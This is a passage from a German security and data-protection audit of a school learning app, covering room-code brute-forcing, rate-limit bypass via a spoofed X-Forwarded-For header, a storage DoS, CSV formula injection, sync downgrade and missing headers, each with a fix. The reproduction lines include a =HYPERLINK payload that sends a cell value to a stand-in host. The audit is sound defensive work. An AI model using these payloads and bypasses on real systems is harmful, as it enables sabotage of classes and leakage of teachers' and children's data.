- **Schweregrad:** P1
- **Sicherheit der Einschätzung:** hoch für die Widersprüche, mittel für die Rechtsfolgen
- **Fundstelle:** `app/impressum/page.tsx` („geschlossener Rahmen … nicht öffentlich zugänglich … weder AVV noch abschließende Datenschutzerklärung … keine echten personenbezogenen Daten von Schülerinnen und Schülern … nicht im regulären Schulbetrieb“); `app/datenschutz/page.tsx` (Abschnitt 4 „Anmeldung mit ChatGPT“; Verantwortlicher = Privatperson); `app/components/live-room-join.tsx:237-243` (Kommentar „… from real classroom use“); Vault 12 („in Produktion … geprüft“), `docs/laufdiktat-pilot-operations.md` (Unterrichtsbeobachtung je Pilotrunde); Entscheidungsprotokoll Z. 443 und Plan `umsetzungsplan-lernraum-ui.md:62-66` (AVV, Löschfristen, Informationstexte, Freigabe „offen“)
- **Beschreibung:** Impressum und Pilotpraxis widersprechen sich. Laut Code-Kommentaren und Doku läuft die App bereits im Unterricht mit Klassen. Gleichzeitig untersagt das Impressum den Einsatz mit echten Schülerdaten und stellt fest, dass weder AVV noch abschließende Datenschutzerklärung vorliegen. „Nicht öffentlich zugänglich“ ist technisch nicht belegt: Die App hat keine Zugangsschranke, ein vorgeschalteter Cloudflare-Access-Schutz war nicht prüfbar. Die Datenschutzerklärung:
  - nennt **keine Rechtsgrundlagen** und keine Speicherfristen (Räume ≤ 24 h nach Ende, Transfers ≤ 24 h, Rate-Limit-Einträge 1 Tag mit **ungesalzenem SHA-256 der IP**, also für IPv4 umkehrbar),
  - erwähnt **die Inhaltsübertragung über Supabase nicht**, ebenso wenig die **Sprachausgabe über Cloud-Stimmen** (B-012), die **Weitergabe von Fortschritt und Fehlerwörtern an alle Raumgeräte** (B-003), die **Einschreibe-QRs mit Namen und LRS** (B-008) und den unverschlüsselten **Schüler-Cloud-Abgleich** (`sync.ts:20-21`),
  - beschreibt eine **nicht existierende ChatGPT-Anmeldung** (Rest der Projektvorlage, `app/chatgpt-auth.ts`, im SW ausgenommen),
  - nennt weder Drittlandbezug (Supabase Inc. und Cloudflare Inc. sind US-Unternehmen; Supabase garantiert laut eigener FAQ nicht, dass Daten die Region nie verlassen, z. B. Logs) noch Datenschutzbeauftragte.
- **Reproduktion / Prüfweg:** Lesen der genannten Seiten und Dokumente.
- **Betroffene Nutzergruppen:** Schulleitung (Verantwortliche), Lehrkräfte, Kinder und Eltern (Transparenz).
- **Mögliche Folgen:** Rechtswidrige Verarbeitung, Beanstandung durch die Aufsicht (BayLfD für öffentliche Schulen), persönliche Haftungs- und Dienstpflichtfragen für die Lehrkraft, Vertrauensverlust bei Eltern.
- **Empfehlung:** Siehe Abschnitt 5. Kurzfristig: Echtbetrieb an die Freigabe durch die Schulleitung nach Beteiligung der behördlichen Datenschutzbeauftragten koppeln. Verzeichnis der Verarbeitungstätigkeiten erstellen, DSFA-Schwellwertprüfung durchführen (Kinder, mögliche Art.-9-Daten, neue Technik → DSFA wahrscheinlich). AVV mit Supabase (DPA mit SCC laut Drittquelle) und Cloudflare abschließen, Vertragspartner muss die Schule bzw. der Sachaufwandsträger sein, nicht die Privatperson. Datenschutzerklärung je Verarbeitung neu schreiben (Zweck, Rechtsgrundlage, Empfänger, Drittland, Frist). ChatGPT-Abschnitt und `app/chatgpt-auth.ts` entfernen. IP-Hashes salzen und rotieren oder durch `CF-Connecting-IP`-basierte Kurzzeitschlüssel ersetzen.
- **Aufwand (grob):** M (Dokumente), organisatorisch L
- **Erfolgskriterium:** Schriftliche Freigabe der Schule. Verzeichnis und DSFA (oder dokumentierte Schwellwertprüfung) liegen vor. Jede Datenverarbeitung aus Abschnitt 5.1 erscheint in der Datenschutzerklärung. Das Impressum widerspricht dem Betrieb nicht mehr.

### B-004 – Vierstelliger Raumcode als einzige Schranke: Lösungen lesen, Stationsstände überschreiben

- **Bereich:** Sicherheit Live-Raum (RPC)
- **Status:** bestätigt (reproduziert, PGlite mit Originalmigrationen)
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `supabase/migrations/20261003120000_room_time_limits.sql:6-110` (`join_room_secure`: Code reicht, Fenster 90 min), `20260920120000_room_identity_contract.sql:185-205` (`get_room_state_secure` liefert `config` inkl. aller `targetWord`), `20260825124001_migrate_laufdiktat_live_rooms.sql:138-156` (`upsert_progress_secure`: in Stationsmodus darf **jeder** Teilnehmer jede Station schreiben, `where room_students.station_number is not null`), `20260908165538_repair_room_contracts.sql:77-86` (`get_my_progress_secure` liest `station-N` für jeden); `src/integrations/laufdiktat/teacher-session.ts:60-82, 84-120` (Raumkonfiguration enthält Lösungen)
- **Beschreibung:** Wer den Code kennt (projiziert, im Link `/raum?code=…`, in Chat-Screenshots), tritt bis 90 min nach Öffnung bei. Mit Teilnehmertoken kann er: (a) alle Aufgaben **mit Lösungen** lesen (Mathe-Ergebnisse, Vokabelübersetzungen, Diktatwörter), auch im Modus, den Vault 02/08 „Lernstandscheck“ nennt; (b) im Stationsmodus jede Station lesen und mit beliebigen Werten überschreiben (`finished`, `errors`, `word_errors` bis 64 KB mit beliebigen Schlüsseln); (c) als Teilnehmer in der Lehrerliste erscheinen. Das Raten aller 10 000 Codes von einer Adresse dauert wegen 600 Beitritten pro 10 min etwa 2,8 h, also länger als das Fenster. Mit B-005 (Header-Fälschung) oder mehreren Adressen geht es schneller, über Realtime (B-003) ganz ohne Limit. Positiv: Tokens werden gehasht, Raumtoken mit 128 bit, Wiedereintritt raumgebunden, Löschung nach 24 h, keine Klarnamen.
- **Reproduktion / Prüfweg:** `repro-b/db-abuse.test.mjs`, Test 2 → `strangerSeesSolutions:["56","Rhythmus"]`, Lehrkraft-RPC zeigt Station 2 mit `errors:99, finished:true, word_errors:{"=HYPERLINK(\"http://x\")":5}`.
- **Betroffene Nutzergruppen:** Lehrkräfte (verfälschte Ergebnisse), Kinder (Stationsfortschritt überschrieben).
- **Mögliche Folgen:** Wertlose Lernstandschecks, Sabotage im Stationsbetrieb, CSV-Injektion (B-007).
- **Empfehlung:** Antworten nicht an Clients ausliefern, wenn der Modus bewertend ist: serverseitige Prüfung per RPC oder Hash plus Salt pro Wort, wohl wissend, dass Hashes bei kleinen Antwortmengen ratbar sind. Stationen an Teilnehmer binden (erste Belegung gewinnt, Wechsel nur durch die Lehrkraft). `word_errors`-Schlüssel serverseitig gegen die Wörter der Raumkonfiguration prüfen. Option „Lobby schließen“ (keine neuen Beitritte nach Start). Länger als 4 Ziffern oder zusätzliche Bestätigung neuer Teilnehmer durch die Lehrkraft erwägen.
- **Aufwand (grob):** M
- **Erfolgskriterium:** DB-Vertragstest: Ein zweiter Teilnehmer kann eine belegte Station nicht überschreiben. `word_errors` mit fremden Schlüsseln wird abgewiesen. Im bewertenden Modus enthält `get_room_state_secure` keine Lösungen.

### B-005 – Rate-Limit vertraut dem linken `X-Forwarded-For`-Eintrag; Schul-NAT teilt einen Topf

- **Bereich:** Sicherheit / Verfügbarkeit Supabase
- **Status:** DB-seitig bestätigt (reproduziert); Ausnutzbarkeit in Produktion begründetes Risiko / offene Frage
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** mittel
- **Fundstelle:** `supabase/migrations/20260825124001_migrate_laufdiktat_live_rooms.sql:67-71` (`private.request_key_hash`: `split_part(x-forwarded-for, ',', 1)`, Fallback `'unknown'`), `20260908165538_repair_room_contracts.sql:3-11` (`enforce_rate_limit`)
- **Beschreibung:** Der Schlüssel ist der **linke** Eintrag. Laut Cloudflare-Doku wird ein vom Client mitgesendetes `X-Forwarded-For` **ergänzt, nicht ersetzt**; der linke Eintrag ist dann frei wählbar. Ob das Supabase-Gateway den Header vorher überschreibt, ist ungeprüft. Das Risikoregister nennt diese Prüfung selbst als offen. Trifft das Ergänzen zu, sind alle Limits (Raum öffnen 12/10 min, Beitritt 600/10 min) wirkungslos. Umgekehrt teilen sich alle Geräte hinter einem Schul-NAT einen Topf. Ein Kind, das im Schulnetz Codes rät, sperrt damit Beitritte für die ganze Schule. Mehr als 12 Raumöffnungen in 10 min sind pro Schule nicht möglich. Der gespeicherte Schlüssel ist ein ungesalzener SHA-256 der IP, für IPv4 per Durchprobieren umkehrbar.
- **Reproduktion / Prüfweg:** `repro-b/db-abuse.test.mjs`, Test 1 → `{"openRoomSameIp":12,"blockedAt13":true,"openRoomWithSpoofedLeftXff":40,"noHeaderSharedBucketBlockedAt13":true}`. Produktionsprüfung (Hauptinstanz/Betreiber, Testprojekt): Request mit `X-Forwarded-For: 10.0.0.1` senden und `current_setting('request.headers')` protokollieren.
- **Betroffene Nutzergruppen:** alle Schulen; Betreiber (Kosten/Kontingente).
- **Mögliche Folgen:** Umgehung der Brute-Force-Bremse oder schulweite Sperre durch ein einzelnes Kind.
- **Empfehlung:** Den von Supabase garantiert gesetzten, nicht fälschbaren Eintrag verwenden (in der Regel den rechtesten vertrauenswürdigen Eintrag bzw. `cf-connecting-ip`, falls von Supabase gesetzt), nach Prüfung in einem Testprojekt. Limits zusätzlich je Raum (Fehlversuche je Code) und je Teilnehmertoken. Die IP mit täglich rotierendem Salz hashen.
- **Aufwand (grob):** S–M
- **Erfolgskriterium:** Dokumentierter Gateway-Test. DB-Vertragstest mit gefälschtem linken Eintrag bleibt gesperrt.

### B-006 – Inhaltsübertragung ohne Rate-Limit: Speicher-DoS des gemeinsamen Supabase-Projekts

- **Bereich:** Verfügbarkeit Supabase
- **Status:** bestätigt (reproduziert, PGlite); Produktionsgrenzen (Request-Größe, Tarif) nicht geprüft
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** mittel
- **Fundstelle:** `supabase/migrations/20260825115651_create_encrypted_content_transfers.sql:111-201` (`reserve_content_transfer` ohne `enforce_rate_limit`), `:203-253` (`upload_content_transfer`, bis 10 MiB je Paket)
- **Beschreibung:** Jeder mit dem öffentlichen Key kann beliebig viele Transfers reservieren und je 10 MiB hochladen. Sie bleiben bis zu 24 h liegen. Räume und Transfers teilen sich ein Projekt. Im Free-Tarif (500 MB DB; Tarif unbekannt) wäre die Datenbank nach rund 50 Uploads voll und ginge in den Nur-Lese-Modus. Dann fallen alle Laufdiktat-Räume aus.
- **Reproduktion / Prüfweg:** `repro-b/db-abuse.test.mjs`, Test 3 → `{"reservationsFromOneIp":301,"tenMiBUploadAccepted":true,"transferRateLimitRows":0}`.
- **Betroffene Nutzergruppen:** alle Schulen (Ausfall der Live-Räume).
- **Mögliche Folgen:** Ausfall des Unterrichtsangebots, Kosten.
- **Empfehlung:** `enforce_rate_limit('reserve_transfer', …)` ergänzen. Paketgröße realistisch begrenzen (Vokabelpakete sind KB groß). Globale Obergrenze aktiver Transfers. Transfers und Räume ggf. in getrennte Projekte legen. Speicher-Alarm einrichten.
- **Aufwand (grob):** S
- **Erfolgskriterium:** DB-Vertragstest: die 21. Reservierung in 10 min von einer Adresse scheitert. Upload über z. B. 512 KiB wird abgewiesen.

### B-007 – CSV-Export neutralisiert keine Formeln; Inhalte sind von Fremden steuerbar

- **Bereich:** Web-Sicherheit / Lehrkraftgerät
- **Status:** bestätigt (reproduziert für die erzeugte Datei); Auswertung in Tabellenprogrammen nicht geprüft
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** hoch (Datei), mittel (Wirkung)
- **Fundstelle:** `src/integrations/laufdiktat/teacher-results.ts:14-17` (`escapeCsv` quotet nur `;"\n`), `:92-97` (Fehlerwörter aus `word_errors`), Namen aus `allNames` (`use-live-room-session.ts:361-368, 459-474`)
- **Beschreibung:** Zellen, die mit `=`, `+`, `-`, `@`, Tab oder CR beginnen, werden nicht entschärft. Quellen der Zellinhalte sind Präsenzschlüssel (B-003, ohne Beitritt fälschbar) und `word_errors`-Schlüssel (B-004, nicht gegen die Raumwörter geprüft). Die Lehrkraft öffnet die Datei in Excel oder Numbers.
- **Reproduktion / Prüfweg:** `repro-b/csv-injection.test.ts` → Zeilen `"=HYPERLINK(""https://example.invalid/?x=""&A3;""Hilfe"")";Aktiv;…`, `=1+1;3`, `"@SUM(1;2)";1`.
- **Betroffene Nutzergruppen:** Lehrkräfte.
- **Mögliche Folgen:** Phishing-Links in der Ergebnisliste, verfälschte Auswertungen. DDE-Angriffe sind in aktuellen Office-Versionen meist entschärft, aber nicht überall.
- **Empfehlung:** OWASP-Empfehlung umsetzen: Zellen mit führendem `= + - @ \t \r` mit `'` voranstellen. Präsenzschlüssel nie exportieren. `word_errors` serverseitig validieren.
- **Aufwand (grob):** S
- **Erfolgskriterium:** Einheitstest mit Formelpräfixen grün.

### B-012 – Sprachausgabe bevorzugt Cloud-Stimmen; Texte gehen an Google/Microsoft

- **Bereich:** Datenschutz (Drittübermittlung)
- **Status:** bestätigt (reproduziert auf Funktionsebene mit nachgebildeten Stimmenlisten); Übermittlung an Anbieter laut Browserdoku, nicht mitgeschnitten
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** mittel bis hoch
- **Fundstelle:** `src/speech/voices.ts:39-55` (`QUALITY_BONUS`: `natural` +30, `neural` +30, `online` +20, `google` +20), `:63-84` (`rankVoice` ignoriert `localService`)
- **Beschreibung:** Die Bewertung belohnt genau die Namensbestandteile von Netzwerkstimmen. In Edge („Microsoft … Online (Natural)“) und Chrome Desktop („Google Deutsch“, `localService=false`) wird damit eine Stimme gewählt, die den Text an Server des Herstellers schickt. Betroffen sind Laufdiktat-Wörter, Textbox-Texte und Vokabeln, darunter von Kindern selbst angelegte Karten. Auf iPadOS sind die Stimmen in der Regel lokal; betroffen sind Windows-Rechner, Chromebooks und Tafel-PCs.
- **Reproduktion / Prüfweg:** `repro-b/voices.test.ts` → `Edge -> Microsoft Katja Online (Natural) … localService=false`, `Chrome -> Google Deutsch localService=false`.
- **Betroffene Nutzergruppen:** Kinder und Lehrkräfte an Windows-/ChromeOS-Geräten.
- **Mögliche Folgen:** Nicht dokumentierte Übermittlung an US-Anbieter. Bei kindereigenen Inhalten kann das personenbezogen sein, etwa wenn ein Kind seinen Namen als Vokabel anlegt.
- **Empfehlung:** `localService === true` stark bevorzugen. Netzwerkstimmen nur nach ausdrücklicher Wahl in den Einstellungen und mit Hinweis zulassen. In die Datenschutzerklärung aufnehmen.
- **Aufwand (grob):** S
- **Erfolgskriterium:** Test: Bei vorhandener lokaler Stimme wird nie eine `localService=false`-Stimme gewählt.

### B-013 – Offline-Fähigkeit schmaler als behauptet; nach jedem Update fast nichts mehr offline; keine echten Offline-Tests

- **Bereich:** Zuverlässigkeit / PWA
- **Status:** bestätigt (Codeanalyse) und teilweise reproduziert (Dev-Server)
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** hoch für die Mechanik, mittel für das genaue Produktionsverhalten
- **Fundstelle:** `scripts/service-worker.template.js:4-11` (Vorabcache nur `/` und Icons), `:25-39` (`activate` löscht **alle** älteren Caches), `:63-66, 75-96` (`networkFirst` ohne Zeitlimit, Rückfall auf HTML von `/`), `:68-72` (nur `style/script/font/image/worker` gecacht; RSC-Abrufe `?_rsc=` werden nicht abgefangen); `playwright.config.ts:24` (`serviceWorkers: "block"`); `e2e/installability.spec.ts` (nur Registrierung); `tests/rendered-html.test.mjs:232-256` (Regex auf Quelltext); `e2e/math-practice.spec.ts:54` (nur Abbruch während einer bereits geladenen Seite)
- **Beschreibung:** Vault 16 verspricht „nach dem ersten Laden weitgehend offline nutzbar“. Tatsächlich gilt: (1) Offline geht nur, was auf diesem Gerät unter der **aktuellen** SW-Version schon einmal geöffnet wurde. (2) Ein Update (häufige Deployments) löscht den alten Cache. Danach ist nur noch das HTML der Startseite vorgeladen, ohne seine Skripte. Ein Kind, das die installierte App zu Hause offline öffnet, nachdem in der Schule ein Update installiert wurde, bekommt eine nicht funktionsfähige Seite. (3) Unbesuchte Routen liefern offline das HTML der Startseite unter fremder URL. (4) Bei schlechtem Schul-WLAN („Lie-Fi“) wartet `networkFirst` ohne Zeitlimit; im Test lud die Navigation in 45 s nicht. (5) Clientseitige Navigation per RSC-Abruf läuft am SW vorbei. Gut gelöst ist der Verbindungsabbruch **während** einer Runde: Die geladene Seite arbeitet lokal weiter (vorhandener E2E-Test), der Fortschritt im Live-Raum wird in Reihenfolge nachgesendet (`progress-delivery.ts`).
- **Reproduktion / Prüfweg:** `repro-b/browser/offline-proxy3.mjs` (Log `offline-proxy3.log`): besuchte Route offline mit Inhalt; `/lernen` und `/frei/mathematics` offline mit rohem `<h1>` „Dein Lernraum“ (Startseiten-HTML) und danach Fehlerseite. `offline-proxy.mjs`: Lie-Fi-Navigation `Timeout 45000ms`. Einschränkung: `vinext dev`; das Verhalten gehashter Produktionschunks ist nicht beobachtet.
- **Betroffene Nutzergruppen:** Kinder beim Üben zu Hause ohne oder mit schlechtem Netz; Klassen mit instabilem WLAN.
- **Mögliche Folgen:** „App geht nicht“ ohne erkennbaren Grund, Abbruch der täglichen Übung, Vertrauensverlust.
- **Empfehlung:** Build-Manifest der Lernrouten und ihrer Chunks vorab cachen (Startseite, `/lernen`, Kernmodule). Navigationen „stale-while-revalidate“ oder network-first mit 3–4 s Zeitlimit. RSC-Abrufe cachen oder offline auf harte Navigation umleiten. Alte Caches erst löschen, wenn der neue Vorabcache vollständig ist. Eine Offline-Seite mit Erklärung zeigen. Eine eigene Playwright-Suite mit `serviceWorkers: "allow"` gegen den **Produktionsbuild** einrichten: Kaltstart offline, Lie-Fi, Update-Wechsel.
- **Aufwand (grob):** M
- **Erfolgskriterium:** E2E gegen Produktionsbuild: nach SW-Update und Netzabschaltung starten `/lernen`, LernBox, Wortspeicher und Kopfrechnen. Lie-Fi-Navigation fällt nach höchstens 5 s auf den Cache zurück.

### B-014 – Geräte-Abgleich akzeptiert unverschlüsselte Datei trotz Passwort (Downgrade)

- **Bereich:** Datenintegrität Cloud-Abgleich
- **Status:** bestätigt (reproduziert)
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `src/integrations/cloud-sync/envelope.ts:221-238` (`openEnvelope`: `encryption === null` → Nutzlast ungeprüft übernommen), `src/integrations/cloud-sync/engine.ts:149-158` (`readRemote`), `:315-321` (`encryptionChanged` erkennt den Wechsel auf „unverschlüsselt“ nicht)
- **Beschreibung:** Ein Gerät mit gesetztem Passwort liest eine Cloud-Datei ohne Verschlüsselung ohne Rückfrage, führt sie zusammen und lädt sie dann wieder verschlüsselt hoch. Damit „adelt“ es fremde Änderungen. Wer Schreibzugriff auf den Ordner hat, das Passwort aber nicht kennt (geteilter Nextcloud-Ordner, kompromittiertes Konto, fremde App mit Ordnerzugriff), kann Material, Aufgaben, Klassen, Schülerlisten und Ergebnisse einschleusen. AES-GCM würde die Integrität gerade schützen, wird hier aber umgangen.
- **Reproduktion / Prüfweg:** `repro-b/sync-downgrade.test.ts` → `{"status":"idle","names":["MANIPULIERT"],"encryptedAfter":true,"uploaded":true}`.
- **Betroffene Nutzergruppen:** Lehrkräfte mit verschlüsseltem Abgleich.
- **Mögliche Folgen:** Manipulierte Aufgaben/Materialien gelangen über die Lehrkraft an Kinder; verfälschte Leistungsbriefe.
- **Empfehlung:** Ist lokal `encrypted = true`, eine unverschlüsselte Remote-Datei als `locked`/Konflikt behandeln und eine ausdrückliche Bestätigung verlangen. Kopf und Nutzlast authentisch binden (Kopf als AES-GCM-AAD).
- **Aufwand (grob):** S
- **Erfolgskriterium:** Der Repro-Test endet mit Status `locked` und unveränderten lokalen Daten.

### B-015 – Keine Sicherheitsheader/CSP; Drittanbieter-Skript mit vollem Zugriff auf Kinderdaten und Schlüssel

- **Bereich:** Web-Sicherheit (Defense in Depth)
- **Status:** bestätigt (Codeanalyse und Dev-Server); Produktions-Header nicht prüfbar
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** hoch für den Repository-Stand
- **Fundstelle:** `next.config.ts` (leer), `worker/index.ts:28-46` (keine Header), `dist/client/_headers` (nur Cache-Control), `app/layout.tsx:112-113` (Inline-Skripte), `src/integrations/cloud-sync/google-identity.ts:39-57` (lädt `https://accounts.google.com/gsi/client` in die eigene Origin)
- **Beschreibung:** Es gibt keine CSP, kein `frame-ancestors`/X-Frame-Options (Clickjacking des Lehrerbereichs möglich), kein HSTS im Repository, keine Referrer-Policy (der Raumcode steht in `/raum?code=`) und keine Permissions-Policy (Kamera). In derselben Origin liegen Lernstände, Lehrerdaten mit Klarnamen und LRS, **exportierbare** private Klassenschlüssel (`classSealSchema.privateJwk`), OAuth-Refresh-Token und ggf. das WebDAV-Passwort im Klartext (B-016). Eine einzige XSS-Lücke oder ein kompromittiertes Drittanbieter-Skript reicht für den Abfluss. XSS selbst habe ich nicht gefunden: React escapt, KaTeX läuft mit `trust:false` und `maxExpand`, es gibt kein `innerHTML` mit Fremddaten. Fonts sind selbst gehostet, es gibt keine Tracker.
- **Reproduktion / Prüfweg:** `curl -D - http://127.0.0.1:3002/` → nur `vary`, `cache-control`, `content-type`.
- **Betroffene Nutzergruppen:** alle.
- **Mögliche Folgen:** Totalabfluss bei einer künftigen Injektionslücke; Clickjacking.
- **Empfehlung:** Header im Worker setzen: CSP mit Nonce für die zwei Inline-Skripte, `connect-src` auf Supabase-, Microsoft-, Google- und WebDAV-Ziele begrenzt (WebDAV ist frei konfigurierbar, deshalb ggf. nur für die Lehrerseiten erweitern), `frame-ancestors 'none'`, HSTS, `Referrer-Policy: no-referrer`, `Permissions-Policy: camera=(self)`. Den Google-Login in ein Popup auf eigener Unterseite auslagern oder auf den Redirect-Fluss mit PKCE umstellen, damit kein Fremdskript in der Haupt-Origin läuft. Klassenschlüssel als nicht exportierbaren `CryptoKey` halten; Export nur für die Sicherung, mit Passwort.
- **Aufwand (grob):** M
- **Erfolgskriterium:** Header-Test in `rendered-html.test.mjs` bzw. gegen den Worker. Mozilla Observatory mindestens B+.

### B-019 – Live-Raum-Identität nur im Sitzungsspeicher: Tab-Verlust auf dem iPad kostet Fortschritt bzw. Raumsteuerung

- **Bereich:** Zuverlässigkeit Live-Raum
- **Status:** begründetes Risiko (Mechanik per Codeanalyse bestätigt, iPad-Verhalten nicht geprüft)
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** mittel
- **Fundstelle:** `src/integrations/laufdiktat/room-api.ts:200-227` (Lehrkrafttoken in `sessionStorage`), `:390-418` (Teilnehmeridentität in `sessionStorage`), `src/integrations/laufdiktat/live-trace.ts:4, 41` (Spurdaten), Migration `20261003120000_room_time_limits.sql:57-59` (kein Neubeitritt nach 90 min)
- **Beschreibung:** Schließt Safari den Tab, iOS beendet die Home-Bildschirm-App im Hintergrund oder das Kind wischt sie weg, gehen Teilnehmertoken und Spur verloren. Ein neuer Beitritt erzeugt einen neuen Teilnehmer: Der alte Fortschritt hängt verwaist in der Lehrerliste, das Kind beginnt von vorn. Nach 90 min ist kein Beitritt mehr möglich. Verliert die Lehrkraft ihren Tab, kann sie den Raum weder steuern noch beenden; er läuft bis zur Serverschließung (120 min). Die Pilot-Doku nennt die Tab-Bindung, bewertet sie aber nicht als Risiko. Positiv: Die Wahl von `sessionStorage` statt `localStorage` begrenzt die Lebensdauer der Geheimnisse. Das ist ein bewusster Zielkonflikt.
- **Reproduktion / Prüfweg:** Codepfad. iPad-Test: Raum beitreten, App aus dem App-Umschalter schließen, neu öffnen.
- **Betroffene Nutzergruppen:** Kinder auf älteren iPads (Speicherdruck), Lehrkräfte am iPad.
- **Mögliche Folgen:** Doppelte oder verwaiste Ergebnisse, Frust, Unterrichtsunterbrechung.
- **Empfehlung:** Teilnehmertoken je Raumcode in IndexedDB mit Ablauf zum Raumende ablegen (`localStorage` nur, wenn kein gemeinsames Gerät). Lehrkrafttoken mit Ablauf ebenso, ggf. verschlüsselt. Die Lehrkraft einen Teilnehmer „zusammenführen“ lassen.
- **Aufwand (grob):** S–M
- **Erfolgskriterium:** E2E: Kontext schließen, neu öffnen → derselbe Teilnehmer, derselbe Fortschritt.

### B-020 – Supabase-Betrieb: Pausierung, Kontingente, Überwachung unbekannt

- **Bereich:** Verfügbarkeit / Betrieb
- **Status:** offene Frage
- **Schweregrad:** P2
- **Sicherheit der Einschätzung:** niedrig (keine Produktionseinsicht)
- **Fundstelle:** Vault 12 (ein Projekt `Lernraum`, eu-west-1, Räume und Transfers gemeinsam); keine Health-Checks oder Alarme im Repository
- **Beschreibung:** Laut mehreren (Dritt-)Quellen pausiert der Free-Tarif Projekte nach 7 Tagen Inaktivität, bis sie jemand im Dashboard reaktiviert. Nach den Herbst- oder Weihnachtsferien würde die erste Stunde scheitern. Datenbank- und Realtime-Kontingente (gleichzeitige Verbindungen) sind ebenfalls tarifabhängig. Es gibt keine dokumentierte Überwachung.
- **Reproduktion / Prüfweg:** Tarif und Projekt-Einstellungen im Supabase-Dashboard prüfen (nur Betreiber).
- **Betroffene Nutzergruppen:** alle Live-Raum-Nutzer.
- **Mögliche Folgen:** Ausfall nach Ferien, bei Klassenstärke oder bei DoS (B-006).
- **Empfehlung:** Tarif dokumentieren. Bei Free-Tarif einen Keep-alive-Job oder Pro-Tarif. Speicher- und Verbindungsalarme. Ein Betriebs-Runbook in `laufdiktat-pilot-operations.md`.
- **Aufwand (grob):** S
- **Erfolgskriterium:** Dokumentierter Tarif, Alarme und Ferientest.

### B-016 – Zugangsdaten im Browser: Refresh-Token und ggf. WebDAV-Passwort im Klartext

- **Bereich:** Sicherheit Cloud-Abgleich
- **Status:** bestätigt (Codeanalyse)
- **Schweregrad:** P3
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `src/integrations/cloud-sync/session.ts:18-20, 61-72` (`lernraum:cloud-sync:tokens` in `localStorage`), `src/integrations/cloud-sync/credentials.ts:66-80` (`{ plain: password }` ohne Schlüssel)
- **Beschreibung:** Der OAuth-Fluss selbst ist sauber: PKCE S256, `state`-Prüfung, kein Client-Secret, `returnTo` nur aus App-Konstanten, also kein Open Redirect, enge Scopes (`Files.ReadWrite.AppFolder`, `drive.appdata`). Token liegen aber im Klartext in `localStorage`, auf geteilten Geräten dauerhaft. Das WebDAV-App-Passwort liegt im Klartext, wenn keine Verschlüsselung gemerkt ist. Das ist im Register (SR-003) teilweise benannt. `login.microsoftonline.com/common` erlaubt private Microsoft-Konten, die Lehrkraft kann also Schuldaten in ihr privates OneDrive legen (siehe Abschnitt 5).
- **Reproduktion / Prüfweg:** Codepfade.
- **Betroffene Nutzergruppen:** Lehrkräfte.
- **Mögliche Folgen:** Kontozugriff bei XSS oder an geteilten Geräten.
- **Empfehlung:** Token in der Credential-DB ablegen, mit dem nicht exportierbaren Schlüssel verschlüsseln. Bei „geteiltes Gerät“ nichts dauerhaft speichern. Optional nur organisatorische Konten zulassen (`organizations` statt `common`), wenn die Schule es verlangt.
- **Aufwand (grob):** S
- **Erfolgskriterium:** Keine Token im Klartext im Speicher (Test).

### B-017 – Inhaltsübertragung: Geheimnisse entstehen auf dem Server; manuelle Codes sperrbar

- **Bereich:** Kryptografie-Design
- **Status:** bestätigt (Codeanalyse)
- **Schweregrad:** P3
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `supabase/migrations/20260825115651_create_encrypted_content_transfers.sql:150-199` (`reserve_content_transfer` erzeugt `retrieval_token` und `manual_secret` und gibt sie im Klartext zurück), `:344-376` (Sperre je Locator nach 5 Fehlversuchen); `src/integrations/content-transfer/crypto.ts:40-70` (Schlüsselumschlag aus genau diesen Geheimnissen)
- **Beschreibung:** Die Kryptografie selbst ist solide: AES-256-GCM, zufälliger Inhaltsschlüssel, zwei getrennte Umschläge, PBKDF2 mit 210 000 Durchläufen, ein Alphabet mit 32 Zeichen ohne Modulo-Verzerrung, Locator mit 40 bit plus Geheimnis mit 80 bit, nur Hashes gespeichert, Brute-Force auch über viele Räume praktisch aussichtslos. Die Geheimnisse **erzeugt** aber der Server. Damit ist die Verschlüsselung keine Ende-zu-Ende-Verschlüsselung gegenüber Supabase, wie es Vault 12 nahelegt („Supabase erhält nur Chiffrat …“). Sie schützt Ruhedaten und Backups, nicht vor dem Betreiber oder einem Mitschnitt der RPC-Antwort. Wer den 24-stelligen Code sieht (am Beamer), kann mit 5 falschen Versuchen den manuellen Abruf für 15 min sperren; der QR-Weg bleibt offen. Die Inhalte sind Lehrkraftmaterial, meist ohne Personenbezug, daher geringe Tragweite.
- **Reproduktion / Prüfweg:** Codepfade; vorhandener DB-Test „locks manual retrieval …“.
- **Betroffene Nutzergruppen:** Lehrkräfte, Kinder (Verfügbarkeit des Abrufs).
- **Mögliche Folgen:** Falsches Sicherheitsversprechen in der Doku; kurzzeitige Abrufsperre.
- **Empfehlung:** Geheimnisse im Client erzeugen und nur Hashes an `reserve_content_transfer` übergeben. Doku präzisieren. Sperre je Locator mit Abklingzeit pro Absender kombinieren.
- **Aufwand (grob):** S–M
- **Erfolgskriterium:** Der Server sieht nie ein Klartextgeheimnis (Vertragstest prüft Signatur der RPC).

### B-018 – Leistungsbriefe, Aufgaben- und Entfernungscodes sind fälschbar

- **Bereich:** Integrität Klassenkommunikation
- **Status:** bestätigt (Codeanalyse)
- **Schweregrad:** P3
- **Sicherheit der Einschätzung:** hoch
- **Fundstelle:** `src/domain/teacher-workspace.ts:183-265` (HMAC-SHA-256 mit `enrollmentToken` als Schlüssel), `:155-168, 267-276` (Aufgaben-QR unsigniert), `src/domain/student-assignment.ts:26-56`, `src/domain/class-enrollment.ts:464-475` (`lernraum:remove:<classId>`)
